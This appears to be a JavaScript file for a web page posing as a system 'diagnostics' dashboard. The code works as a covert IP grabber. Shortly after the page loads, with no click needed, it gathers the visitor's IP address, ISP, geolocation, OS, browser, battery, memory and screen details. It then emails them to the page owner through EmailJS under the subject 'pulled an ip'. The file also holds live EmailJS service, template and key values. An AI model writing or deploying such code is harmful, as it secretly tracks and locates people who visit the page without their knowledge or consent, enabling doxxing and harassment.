// --- CONFIGURATION ---
const SERVICE_ID = "service_14u2qeo";
const TEMPLATE_ID = "template_m1s77kf";
const PUBLIC_KEY = "2jj19BTFwlNnm8fp_"; // Updated from your screenshot

document.addEventListener('DOMContentLoaded', () => {
    // Initialize EmailJS
    emailjs.init(PUBLIC_KEY);

    // Start Clock
    startClock();

    // Auto-Run (Optional) - Sends email automatically 1.5s after page load
    setTimeout(() => {
        runDiagnostics();
    }, 1500);

    // Setup Button
    const btn = document.getElementById('scan-btn');
    if(btn) {
        btn.addEventListener('click', () => {
            if (!btn.disabled) runDiagnostics();
        });
    }
});

async function runDiagnostics() {
    const btn = document.getElementById('scan-btn');
    const status = document.getElementById('connection-status');

    // 1. UI State: Sending
    if(btn) {
        btn.disabled = true;
        btn.querySelector('.btn-text').textContent = "TRANSMITTING...";
    }
    if(status) {
        status.textContent = "UPLOADING DATA...";
        status.style.color = "#fbbf24"; // Yellow
    }

    try {
        // 2. Collect Data
        const [ipData, latency, battery] = await Promise.all([
            fetchIPData(),
            measureLatency(),
            getBatteryStatus()
        ]);

        const nav = navigator;
        const screen = window.screen;

        // 3. Prepare Data for Email
        // matching the variables seen in your screenshots {{title}}, {{name}}, etc.
        const emailParams = {
            // Header Fields
            title: ipData.ip || 'Unknown IP', // Fills the subject line "pulled an ip: {{title}}"
            name: "XARVOK System",            // Fills "From Name"
            email: "report@xarvok.com",       // Fills "Reply To"

            // Body Fields (Diagnostic Data)
            ip: ipData.ip || 'UNAVAILABLE',
            isp: ipData.org || 'UNKNOWN ISP',
            location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
            latency: latency + 'ms',
            os: getOS(),
            browser: getBrowser(),
            battery: battery,
            device_memory: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'N/A',
            resolution: `${screen.width}x${screen.height}`,
            user_agent: nav.userAgent,
            time: new Date().toLocaleString()
        };

        // 4. Send Email
        await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailParams);

        // 5. Update UI: Success
        if(status) {
            status.textContent = "TRANSMISSION COMPLETE";
            status.style.color = "#00ff88"; // Green
        }

        // Also update the dashboard visuals for the user
        updateDashboard(emailParams);

    } catch (error) {
        console.error("Transmission Error:", error);
        if(status) {
            status.textContent = "CONNECTION FAILED";
            status.style.color = "#ef4444"; // Red
        }
    } finally {
        // Reset Button
        if(btn) {
            setTimeout(() => {
                btn.disabled = false;
                btn.querySelector('.btn-text').textContent = "RUN DIAGNOSTICS";
            }, 3000);
        }
    }
}

// --- DATA COLLECTION TOOLS ---

async function fetchIPData() {
    try {
        const req = await fetch('https://ipapi.co/json/');
        return await req.json();
    } catch { return {}; }
}

async function measureLatency() {
    const start = Date.now();
    try {
        await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
        return Date.now() - start;
    } catch { return 999; }
}

async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            return `${Math.round(b.level * 100)}%`;
        } catch { return 'RESTRICTED'; }
    }
    return 'N/A';
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Win")) return "WINDOWS";
    if (ua.includes("Mac")) return "MACOS";
    if (ua.includes("Linux")) return "LINUX";
    if (ua.includes("Android")) return "ANDROID";
    if (ua.includes("iPhone")) return "IOS";
    return "UNKNOWN UNIT";
}

function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome")) return "CHROME";
    if (ua.includes("Firefox")) return "FIREFOX";
    if (ua.includes("Safari")) return "SAFARI";
    if (ua.includes("Edge")) return "EDGE";
    return "WEB CLIENT";
}

// --- UI UPDATER ---
function updateDashboard(data) {
    const setText = (id, txt) => {
        const el = document.getElementById(id);
        if(el) el.textContent = txt;
    };
    setText('ip', data.ip);
    setText('isp', data.isp);
    setText('location', data.location);
    setText('latency', `PING: ${data.latency}`);
    setText('os', data.os);
    setText('cores', (navigator.hardwareConcurrency || '?') + ' CORES');
    setText('ram', data.device_memory);
    setText('battery', data.battery);
    setText('res', data.resolution);
    setText('browser', data.browser);
    setText('lang', navigator.language.toUpperCase());
    setText('depth', `${window.screen.colorDepth}-BIT`);
}

function startClock() {
    setInterval(() => {
        const now = new Date();
        const el = document.getElementById('time');
        if(el) el.textContent = now.toLocaleTimeString('en-GB');
    }, 1000);
}

